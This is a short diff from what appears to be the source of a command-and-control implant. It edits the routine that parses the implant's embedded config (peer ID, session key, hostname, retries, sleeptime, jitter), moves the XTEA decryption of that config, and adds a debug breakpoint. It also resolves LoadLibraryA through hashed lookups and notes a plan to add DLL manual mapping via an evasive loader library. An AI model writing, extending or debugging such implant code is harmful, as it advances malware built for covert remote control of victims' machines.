@@ -147,12 +147,18 @@ namespace Main {
         bool success    = true;
         _parser parser  = { };
 
+        __debugbreak();
+
         CreateParser(&parser, Config, sizeof(Config));
         MemSet(Config, 0, sizeof(Config));
 
         Ctx->session.peer_id = UnpackUint32(&parser);
-
         ParserMemcpy(&parser, &Ctx->config.session_key, nullptr);
+
+        if (ENCRYPTED) {
+            XteaCrypt(B_PTR(parser.buffer), parser.Length, Ctx->config.session_key, false);
+        }
+
         ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
 
         Ctx->session.retries        = UnpackUint32(&parser);
@@ -161,9 +167,6 @@ namespace Main {
         Ctx->config.sleeptime       = UnpackUint32(&parser);
         Ctx->config.jitter          = UnpackUint32(&parser);
 
-        if (ENCRYPTED) {
-            XteaCrypt(B_PTR(parser.buffer) + 0x12, parser.Length - 0x12, Ctx->config.session_key, false);
-        }
         // TODO: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
 
         if (F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA)) {
